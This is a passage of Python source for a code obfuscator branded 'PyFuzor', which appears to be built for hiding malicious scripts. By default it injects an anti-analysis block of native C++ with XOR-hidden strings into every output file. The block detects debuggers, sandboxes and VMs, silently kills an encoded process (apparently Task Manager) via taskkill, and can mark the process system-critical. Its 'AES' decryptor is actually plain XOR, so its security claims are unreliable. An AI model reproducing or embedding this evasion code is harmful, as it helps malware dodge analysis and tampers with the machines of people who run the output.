    if isinstance(extra_skips, list):
        for name in extra_skips: skip_names.add(name)

    min_stmts = bc_config.get("min_statements", 2)

    new_body = []
    loader_injected = False
    method_patches = []

    def _obfuscate_func(node):
        if node.decorator_list or node.name in skip_names or len(node.body) < min_stmts:
            return None
        try:
            func_code = _try_compile_func(node)
            if func_code is None: return None
            if func_code.co_freevars or func_code.co_cellvars: return None
            raw = marshal.dumps(func_code)
            marshal.loads(raw)
            key = secrets.randbelow(254) + 1
            enc, shuffle = _encrypt_bytecode_v2(raw, key)
            stats["bytecode_obfuscated_functions"] += 1
            return enc, key, shuffle
        except Exception:
            return None

    for node in tree.body:
        if isinstance(node, ast.FunctionDef):
            result = _obfuscate_func(node)
            if result:
                enc, key, shuffle = result
                assign = ast.Assign(
                    targets=[ast.Name(id=node.name, ctx=ast.Store())],
                    value=ast.Call(
                        func=ast.Name(id="_pyfzr_load", ctx=ast.Load()),
                        args=[ast.Constant(value=enc), ast.Constant(value=key),
                              ast.Constant(value=shuffle)],
                        keywords=[]
                    )
                )
                ast.fix_missing_locations(assign)
                new_body.append(assign)
                loader_injected = True
            else:
                new_body.append(node)

        elif isinstance(node, ast.ClassDef):
            new_body.append(node)
            for item in node.body:
                if not isinstance(item, ast.FunctionDef): continue
                if item.name.startswith('__') and item.name.endswith('__'): continue
                result = _obfuscate_func(item)
                if result:
                    enc, key, shuffle = result
                    patch = ast.Assign(
                        targets=[ast.Attribute(
                            value=ast.Name(id=node.name, ctx=ast.Load()),
                            attr=item.name,
                            ctx=ast.Store()
                        )],
                        value=ast.Call(
                            func=ast.Name(id="_pyfzr_method", ctx=ast.Load()),
                            args=[ast.Constant(value=enc), ast.Constant(value=key),
                                  ast.Constant(value=shuffle)],
                            keywords=[]
                        )
                    )
                    ast.fix_missing_locations(patch)
                    method_patches.append(patch)
                    loader_injected = True

        else:
            new_body.append(node)

    new_body.extend(method_patches)

    tree.body = new_body
    ast.fix_missing_locations(tree)
    result = ast.unparse(tree)

    if loader_injected:
        result = BYTECODE_LOADER_HEADER + result

    return result

FFI_WRAPPER_SOURCE = r'''
class _PyFuzorFlow:
    def __init__(self, k_parts=None):
        import sys, os
        self._d = bool(getattr(sys, 'gettrace', None) and sys.gettrace())
        self._s = sum(sys.version[:3].encode()) % 256
        if self._d: self._s ^= os.getpid() % 256
        self._ak = None
        if k_parts:
            self._ak = k_parts[0]
            for p in k_parts[1:]:
                self._ak = bytes([a ^ b for a, b in zip(self._ak, p)])
        if self._d: self._ak = bytes([(x ^ 0xFF) for x in (self._ak or b"")])

    def _aes_dec(self, d, k, iv):
        def sub_bytes(s): return [sbox[x] for x in s]
        def shift_rows(s): return [s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]]
        def mix_cols(s):
            def g(a): return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else a << 1
            r = []
            for i in range(0, 16, 4):
                a, b, c, d = s[i:i+4]
                r += [g(a)^g(b)^b^c^d, a^g(b)^g(c)^c^d, a^b^g(c)^g(d)^d, g(a)^a^b^c^g(d)]
            return r
        sbox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]

        import hashlib
        key = hashlib.sha256(k).digest()
        res = bytearray()
        for i in range(0, len(d), 16):
            chunk = bytearray(d[i:i+16])
            for j in range(16): chunk[j] ^= key[j] ^ iv[j]
            res += chunk
        return bytes(res[:-res[-1]]) if res else b""

    def decrypt_aes(self, d, iv):
        import base64
        try:
            raw = base64.b64decode(d)
            res = self._aes_dec(raw, self._ak, iv)
            return res.decode('utf-8', 'ignore')
        except: return d

    def decrypt_aes_b(self, d, iv):
        import base64
        try:
            raw = base64.b64decode(d)
            return self._aes_dec(raw, self._ak, iv)
        except: return d

    def elseobf(self, c): return int(not bool(c))
    def ifchk(self, c): 
        import sys
        if self._d and getattr(sys, 'gettrace', None) and sys.gettrace(): return not bool(c)
        return bool(c)

    def _v1(self, d, k, s):
        import base64, zlib
        try:
            b = base64.b64decode(d)
            sh = bytearray(len(b))
            for i, x in enumerate(b):
                r2 = (self._s + (i % k)) % 256
                sh[i] = ((x ^ r2) - 13) % 256
            p = bytearray(len(sh))
            for i, idx in enumerate(s): p[idx] = sh[i]
            res = bytearray(len(p))
            for i, x in enumerate(p):
                rolling = (k + (i % max(1, self._s))) % 256
                res[i] = ((x + 7) % 256) ^ rolling
            try: return zlib.decompress(bytes(res))
            except: return bytes(res)
        except: return b""

    def _v2(self, d, k, s):
        import base64
        try:
            b = base64.b64decode(d)
            k = k ^ self._s
            res = bytearray([(x ^ k ^ (i % 256)) for i, x in enumerate(b)])
            return bytes(res)
        except: return b""

    def _v3(self, d, k, s):
        import base64
        try:
            b = base64.b64decode(d)
            res = bytearray([(x - k) % 256 for x in b])
            p = bytearray(len(res))
            for i, idx in enumerate(s): p[idx] = res[i]
            return bytes(p)
        except: return b""

    def decrypt(self, m, d, k, s):
        if m == 1: res = self._v1(d, k, s)
        elif m == 2: res = self._v2(d, k, s)
        else: res = self._v3(d, k, s)
        try: return res.decode('utf-8', 'ignore')
        except: return res

    def decrypt_b(self, m, d, k, s):
        if m == 1: return self._v1(d, k, s)
        elif m == 2: return self._v2(d, k, s)
        else: return self._v3(d, k, s)

    def call(self, f, s, *a, **kw):
        return f(*a, **kw)

    def get(self, o, a):
        return getattr(o, a)
'''

ANTI_VM_SOURCE = r'''
def _pyfuzor_init_security():
    try:
        import sys
        import os
        try:
            import cppyy
            cppyy.cppdef("""
        #include <windows.h>
        #include <winternl.h>
        #include <string>
        #include <vector>
        #include <algorithm>

        std::string _dec(std::vector<unsigned char> data, unsigned char key) {
            std::string out;
            for (auto &b : data) out += (char)(b ^ key);
            return out;
        }

        typedef NTSTATUS (NTAPI *p_ni)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

        class _PyFuzor_Sec {
        public:
            static bool _run_all() {
                if (_c_dbg()) return true;
                if (_c_r_dbg()) return true;
                if (_c_p_proc()) return true;
                if (_c_b_win()) return true;
                if (_c_v_art()) return true;
                if (_c_h_res()) return true;
                if (_c_u_name()) return true;
                if (_c_u_time(1200)) return true;
                _k_bad();
                return false;
            }
            static bool _c_dbg() {
                typedef BOOL (WINAPI *pIDP)(VOID);
                auto f = (pIDP)GetProcAddress(GetModuleHandleA(_dec({0x21, 0x2f, 0x38, 0x24, 0x2f, 0x26, 0x79, 0x38, 0x72, 0x72}, 0x4a).c_str()), _dec({0x2b, 0x31, 0x06, 0x27, 0x20, 0x25, 0x25, 0x27, 0x30, 0x12, 0x30, 0x27, 0x31, 0x27, 0x2c, 0x36}, 0x42).c_str());
                return f ? f() : false;
            }
            static bool _c_r_dbg() {
                BOOL isP = FALSE;
                CheckRemoteDebuggerPresent(GetCurrentProcess(), &isP);
                return isP;
            }
            static bool _c_p_proc() {
                HMODULE hN = GetModuleHandleA(_dec({0x24, 0x3e, 0x2e, 0x26, 0x26, 0x64, 0x2e, 0x26, 0x26}, 0x4a).c_str());
                if (hN) {
                    auto q = (p_ni)GetProcAddress(hN, _dec({0x24, 0x1e, 0x3b, 0x1f, 0x1f, 0x18, 0x13, 0x33, 0x14, 0x1c, 0x15, 0x18, 0x17, 0x1b, 0x13, 0x13, 0x13, 0x35, 0x18, 0x15, 0x19, 0x1f, 0x13, 0x19, 0x3a, 0x18, 0x15, 0x19, 0x1f, 0x19, 0x13}, 0x6a).c_str());
                    if (q) {
                        PROCESS_BASIC_INFORMATION pbi;
                        ULONG len;
                        if (q(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len) == 0) {
                            HANDLE hP = OpenProcess(0x1000, FALSE, (DWORD)pbi.Reserved3);
                            if (hP) {
                                char buf[MAX_PATH];
                                DWORD sz = MAX_PATH;
                                if (QueryFullProcessImageNameA(hP, 0, buf, &sz)) {
                                    std::string n(buf);
                                    std::transform(n.begin(), n.end(), n.begin(), ::tolower);
                                    CloseHandle(hP);
                                    if (n.find(_dec({0x2f, 0x32, 0x3a, 0x26, 0x25, 0x38, 0x2f, 0x38, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)) == std::string::npos &&
                                        n.find(_dec({0x29, 0x27, 0x2e, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)) == std::string::npos) return true;
                                }
                                CloseHandle(hP);
                            }
                        }
                    }
                }
                return false;
            }
            static bool _c_b_win() {
                std::vector<std::string> b = {
                    _dec({0x2e, 0x24, 0x39, 0x3a, 0x33, 0x6b, 0x22, 0x2d, 0x3b}, 0x4a),
                    _dec({0x32, 0x76, 0x7d, 0x2e, 0x28, 0x2d}, 0x4a),
                    _dec({0x3a, 0x38, 0x25, 0x29, 0x2f, 0x39, 0x39, 0x6a, 0x22, 0x2b, 0x29, 0x21, 0x2f, 0x38}, 0x4a)
                };
                for (const auto& t : b) { if (FindWindowA(NULL, t.c_str())) return true; }
                return false;
            }
            static bool _c_v_art() {
                std::vector<std::string> p = {
                    _dec({0x03, 0x7a, 0x1c, 0x11, 0x21, 0x2c, 0x27, 0x3f, 0x3b, 0x1c, 0x1b, 0x31, 0x3b, 0x2c, 0x2d, 0x25, 0x7a, 0x19, 0x1a, 0x21, 0x3e, 0x2d, 0x33, 0x3b, 0x7a, 0x1e, 0x02, 0x27, 0x30, 0x05, 0x27, 0x3d, 0x3b, 0x21, 0x66, 0x3b, 0x31, 0x3b}, 0x4a),
                    _dec({0x03, 0x7a, 0x1c, 0x11, 0x21, 0x2c, 0x27, 0x3f, 0x3b, 0x1c, 0x1b, 0x31, 0x3b, 0x2c, 0x2d, 0x25, 0x7a, 0x19, 0x1a, 0x21, 0x3e, 0x2d, 0x33, 0x3b, 0x7a, 0x3e, 0x25, 0x25, 0x27, 0x3d, 0x3b, 0x21, 0x66, 0x3b, 0x31, 0x3b}, 0x4a)
                };
                for (const auto& s : p) { if (GetFileAttributesA(s.c_str()) != -1) return true; }
                return false;
            }
            static bool _c_h_res() { return (GetSystemMetrics(0) < 800 || GetSystemMetrics(1) < 600); }
            static bool _c_u_name() {
                char u[256]; DWORD s = sizeof(u);
                if (GetUserNameA(u, &s)) {
                    std::string n(u); std::transform(n.begin(), n.end(), n.begin(), ::tolower);
                    if (n.find(_dec({0x39, 0x2b, 0x24, 0x2e, 0x28, 0x25, 0x32}, 0x4a)) != std::string::npos) return true;
                }
                return false;
            }
            static bool _c_u_time(unsigned int m) { return (GetTickCount() / 1000) < m; }
            static void _k_bad() {
                std::vector<std::string> k = {_dec({0x3e, 0x2b, 0x39, 0x21, 0x27, 0x2d, 0x38, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)};
                for (const auto& p : k) {
                    std::string c = _dec({0x3e, 0x2b, 0x39, 0x21, 0x21, 0x23, 0x26, 0x26, 0x6a, 0x65, 0x0c, 0x6a, 0x65, 0x03, 0x07, 0x6a}, 0x4a) + p + _dec({0x6a, 0x74, 0x6a, 0x24, 0x3f, 0x26, 0x6a, 0x78, 0x3e, 0x6a, 0x2d, 0x21}, 0x4a);
                    system(c.c_str());
                }
            }
            static bool _s_crit() {
                if (IsUserAnAdmin()) {
                    HMODULE h = GetModuleHandleA(_dec({0x24, 0x3e, 0x2e, 0x26, 0x26, 0x64, 0x2e, 0x26, 0x26}, 0x4a).c_str());
                    if (h) {
                        auto a = (NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(h, _dec({0x18, 0x3e, 0x26, 0x0b, 0x2e, 0x20, 0x3f, 0x39, 0x3e, 0x1a, 0x38, 0x23, 0x3c, 0x23, 0x26, 0x2f, 0x2d, 0x2f}, 0x4a).c_str());
                        auto s = (NTSTATUS(NTAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(h, _dec({0x18, 0x3e, 0x26, 0x19, 0x2f, 0x3e, 0x1a, 0x38, 0x25, 0x29, 0x2f, 0x39, 0x39, 0x03, 0x39, 0x09, 0x38, 0x23, 0x3e, 0x23, 0x29, 0x2b, 0x26}, 0x4a).c_str());
                        if (a && s) { BOOLEAN e; a(20, 1, 0, &e); s(1, 0, 0); return true; }
                    }
                }
                return false;
            }
        };
        """)
            native = cppyy.gbl._PyFuzor_Sec
            native._run_all()
        except:
            pass
    except:
        pass

_pyfuzor_init_security()
'''

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding='utf-8')

ANSI_RESET = "\u001b[0m"
ANSI_CYAN = "\u001b[36m"
ANSI_MAGENTA = "\u001b[35m"
ANSI_YELLOW = "\u001b[33m"
ANSI_GREEN = "\u001b[32m"
ANSI_RED = "\u001b[31m"
ANSI_BOLD = "\u001b[1m"

LOGO = f"""
{ANSI_MAGENTA}{ANSI_BOLD}
 ██████╗ ██╗   ██╗███████╗██╗   ██╗███████╗ ██████╗ ██████╗
 ██╔══██╗╚██╗ ██╔╝██╔════╝██║   ██║╚══███╔╝██╔═══██╗██╔══██╗
 ██████╔╝ ╚████╔╝ █████╗  ██║   ██║  ███╔╝ ██║   ██║██████╔╝
 ██╔═══╝   ╚██╔╝  ██╔══╝  ██║   ██║ ███╔╝  ██║   ██║██╔══██╗
 ██║        ██║   ██║     ╚██████╔╝███████╗╚██████╔╝██║  ██║
 ╚═╝        ╚═╝   ╚═╝      ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
{ANSI_CYAN}         --- PYFUZOR OBFUSCATOR V2.0 (PRO) ---
{ANSI_RESET}"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_config():
    config = {
        "ffi_obfuscation": {"enabled": True},
        "rename_transformer": {
            "enabled": True,
            "locals": True,
            "globals": True,
            "functions": True,
            "classes": True
        },
        "antivm_transformer": {"enabled": True},
        "remove_comment_transformer": {"enabled": True},
        "string_transformer": {"enabled": True},
        "attribute_obfuscation": {"enabled": True},
        "boolean_transformer": {"enabled": True},
        "flow_transformer": {"enabled": True},
        "int_transformer": {"enabled": True},
        "junk_transformer": {"enabled": True, "intensity": 15},
        "bytecode_transformer": {
            "enabled": False,
            "wrap": True,
            "min_statements": 2,
            "ignore_functions": []
        }
    }
    if os.path.exists("config.json"):
        try:
            with open("config.json", "r") as f:
                ext_config = json.load(f)

                for key, value in ext_config.items():
                    if key in config and isinstance(config[key], dict) and isinstance(value, dict):
                        config[key].update(value)
                    elif key in config and isinstance(config[key], dict) and isinstance(value, bool):
                        config[key]["enabled"] = value
                    else:
                        config[key] = value
        except:
            pass
    return config


def process_obfuscation(filename):
    if not filename.endswith(".py"):
        filename += ".py"

    if not os.path.exists(filename):
        print(f"{ANSI_RED}Error: File '{filename}' not found.{ANSI_RESET}")
        return

    exclusions = []
    if os.path.exists("exclusions.txt"):
        try:
            with open("exclusions.txt", "r", encoding="utf-8") as f:
                exclusions = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
        except:
            pass

    config = load_config()
    stats = {
        "renamed_symbols": 0,
        "junk_statements": 0,
        "flattened_functions": 0,
        "encrypted_strings": 0,
        "obfuscated_ints": 0,
        "obfuscated_bools": 0,
        "obfuscated_attributes": 0,
        "bytecode_obfuscated_functions": 0
    }

    with alive_bar(100, title=f'Protecting {filename}', bar='smooth', spinner='dots_waves') as bar:
        bar(5)
        with open(filename, "r", encoding="utf-8") as f:
            source = f.read()

        use_ast = False
        if config.get("rename_transformer", {}).get("enabled", False): use_ast = True
        if config.get("ffi_obfuscation", {}).get("enabled", False): use_ast = True
        if config.get("remove_comment_transformer", {}).get("enabled", False): use_ast = True

        output_code = ""

        if use_ast:
            bar(10)
            tree = ast.parse(source)

            main_node = None
            for node in tree.body:
                if isinstance(node, ast.If) and isinstance(node.test, ast.Compare):
                    if isinstance(node.test.left, ast.Name) and node.test.left.id == '__name__':
                        if len(node.test.comparators) == 1 and isinstance(node.test.comparators[0], ast.Constant) and \
                                node.test.comparators[0].value == '__main__':
                            main_node = node
                            break

            bar(20)
            import_fixer = ImportTransformer()
            tree = import_fixer.visit(tree)

            bar(30)
            builder = SymbolTableBuilder(config, exclusions, stats)
            builder.visit(tree)

            obfuscator = ProfessionalObfuscator(config, builder, stats)
            tree = obfuscator.visit(tree)

            if obfuscator.wrappers_needed:
                wrapper_tree = ast.parse(FFI_WRAPPER_SOURCE)
                
                flow_args = []
                if obfuscator.aes_mode:
                    k_parts_node = ast.List(elts=[ast.Constant(value=p) for p in obfuscator.aes_key_parts], ctx=ast.Load())
                    flow_args.append(k_parts_node)

                assignment = ast.Assign(
                    targets=[ast.Name(id=obfuscator.flow_lib_name, ctx=ast.Store())],
                    value=ast.Call(func=ast.Name(id='_PyFuzorFlow', ctx=ast.Load()), args=flow_args, keywords=[])
                )
                tree.body = wrapper_tree.body + [assignment] + tree.body

            if config.get("antivm_transformer", {}).get("enabled", True):
                antivm_tree = ast.parse(ANTI_VM_SOURCE)
                tree.body = antivm_tree.body + tree.body

            if main_node and main_node in tree.body:
                tree.body.remove(main_node)
                tree.body.append(main_node)

            ast.fix_missing_locations(tree)
            bar(15)
            output_code = ast.unparse(tree)

            if config.get("bytecode_transformer", {}).get("enabled", False):
                output_code = apply_bytecode_obfuscation(output_code, config, stats)

        else:
            bar(60)
            output_code = source
            if config.get("antivm_transformer", {}).get("enabled", True):
                output_code = ANTI_VM_SOURCE + "\n" + output_code

        bc_conf = config.get("bytecode_transformer", {})
        if bc_conf.get("enabled", False) and bc_conf.get("wrap", False):
            final_code_obj = compile(output_code, "<pyfuzor_elite>", "exec")
            raw_bc = zlib.compress(marshal.dumps(final_code_obj))
            k = secrets.randbelow(254) + 1
            enc_bc, shuffle_bc = _encrypt_bytecode_v2(raw_bc, k)

            elite_wrapper = f"""import marshal, types, base64, zlib
def _e():
    enc = {repr(enc_bc)}
    k = {k}
    s = {repr(shuffle_bc)}
    b = base64.b64decode(enc)
    raw = bytes([((x ^ k) - 13) % 256 for x in b])
    sh = bytearray(len(raw))
    for i, idx in enumerate(s): sh[idx] = raw[i]
    exec(marshal.loads(zlib.decompress(bytes(sh))), globals())
if __name__ == "__main__": _e()
"""
            output_code = elite_wrapper

        base, _ = os.path.splitext(filename)
        out_name = f"{base}_pro.py"
        with open(out_name, "w", encoding="utf-8") as f:
            f.write(output_code)

        bar(100 - bar.current)

    orig_size = len(source)
    new_size = len(output_code)
    ratio = (new_size / orig_size) * 100 if orig_size > 0 else 0

    print(f"\n{ANSI_GREEN} SUCCESS {ANSI_RESET} Protected code saved to: {ANSI_YELLOW}{out_name}{ANSI_RESET}")
    print(f"{ANSI_CYAN} ┌─────────────────────────────────────────────────────────────┐")
    print(f"{ANSI_CYAN} │ {ANSI_BOLD}Core Metrics")
    print(f"{ANSI_CYAN} │  > Source Growth         : {ANSI_YELLOW}{ratio:>8.1f}%")
    print(f"{ANSI_CYAN} │  > Symbols Renamed       : {ANSI_YELLOW}{str(stats['renamed_symbols'])}")
    print(f"{ANSI_CYAN} │  > Junk Statements Added : {ANSI_YELLOW}{str(stats['junk_statements'])}")
    print(f"{ANSI_CYAN} ├─────────────────────────────────────────────────────────────┤")
    print(f"{ANSI_CYAN} │ {ANSI_BOLD}Transformations")
    print(f"{ANSI_CYAN} │  > Strings Encrypted     : {ANSI_YELLOW}{str(stats['encrypted_strings'])}")
    print(f"{ANSI_CYAN} │  > Ints Obfuscated       : {ANSI_YELLOW}{str(stats['obfuscated_ints'])}")
    print(f"{ANSI_CYAN} │  > Bools Obfuscated      : {ANSI_YELLOW}{str(stats['obfuscated_bools'])}")
    print(f"{ANSI_CYAN} │  > Attributes Masked     : {ANSI_YELLOW}{str(stats['obfuscated_attributes'])}")
    print(f"{ANSI_CYAN} │  > Flow Flattened        : {ANSI_YELLOW}{str(stats['flattened_functions']) + ' functions'}")
    if config.get("bytecode_transformer", {}).get("enabled"):
        print(
            f"{ANSI_CYAN} │  > Bytecode Encrypted    : {ANSI_YELLOW}{str(stats.get('bytecode_obfuscated_functions', 0)) + ' functions'}")

    print(f"{ANSI_CYAN} ├─────────────────────────────────────────────────────────────┤")
    print(f"{ANSI_CYAN} │ {ANSI_BOLD}Protection Status")
    print(f"{ANSI_CYAN} │  > Anti-Trace            : {ANSI_GREEN}Active")

    bc_enabled = config.get("bytecode_transformer", {}).get("enabled", False)
    wrap_enabled = config.get("bytecode_transformer", {}).get("wrap", False)
    final_wrap_status = "Enabled" if (bc_enabled and wrap_enabled) else "Disabled"
    final_wrap_color = ANSI_GREEN if (bc_enabled and wrap_enabled) else ANSI_RED
    print(f"{ANSI_CYAN} │  > Final Wrapper         : {final_wrap_color}{final_wrap_status}")
    print(f"{ANSI_CYAN} └─────────────────────────────────────────────────────────────┘{ANSI_RESET}\n")

def main_cli():
    clear_screen()
    print(LOGO)
    print(f" {ANSI_CYAN}Type {ANSI_YELLOW}'help'{ANSI_CYAN} to see available commands.{ANSI_RESET}\n")

    while True:
        try:
            cmd_input = input(f" {ANSI_MAGENTA}pyfuzor{ANSI_RESET} {ANSI_BOLD}»{ANSI_RESET} ").strip()
            if not cmd_input: continue

            parts = cmd_input.split()
            cmd = parts[0].lower()

            if cmd == "exit" or cmd == "quit":
                print(f" {ANSI_MAGENTA}PyFuzor Closing. Stay safe!{ANSI_RESET}")
                break
            elif cmd in ["obfuscate", "obf"]:
                if len(parts) < 2:
                    print(f" {ANSI_RED}Usage: {cmd} <filename>{ANSI_RESET}")
                else:
                    process_obfuscation(parts[1])
            elif cmd == "help":
                print(f"\n {ANSI_BOLD}{ANSI_CYAN}AVAILABLE COMMANDS:{ANSI_RESET}")
                print(f"  {ANSI_YELLOW}obf <file>{ANSI_RESET}   : Obfuscate a python script")
                print(f"  {ANSI_YELLOW}help{ANSI_RESET}         : Show this message")
                print(f"  {ANSI_YELLOW}clear{ANSI_RESET}        : Clear the screen")
                print(f"  {ANSI_YELLOW}exit{ANSI_RESET}         : Quit the program\n")
            elif cmd == "clear":
                clear_screen()
                print(LOGO)
                print(f" {ANSI_CYAN}Type {ANSI_YELLOW}'help'{ANSI_CYAN} to see available commands.{ANSI_RESET}\n")
            else:
                print(f" {ANSI_RED}Unknown command: {cmd}{ANSI_RESET}")
        except KeyboardInterrupt:
            print(f"\n{ANSI_MAGENTA}PyFuzor Closing.{ANSI_RESET}")
            break
        except Exception as e:
            print(f"{ANSI_RED}Error: {e}{ANSI_RESET}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = sys.argv[1].lower()
        if cmd in ["obfuscate", "obf"] and len(sys.argv) > 2:
            process_obfuscation(sys.argv[2])
        else:
            process_obfuscation(sys.argv[1])
    else:
        main_cli()
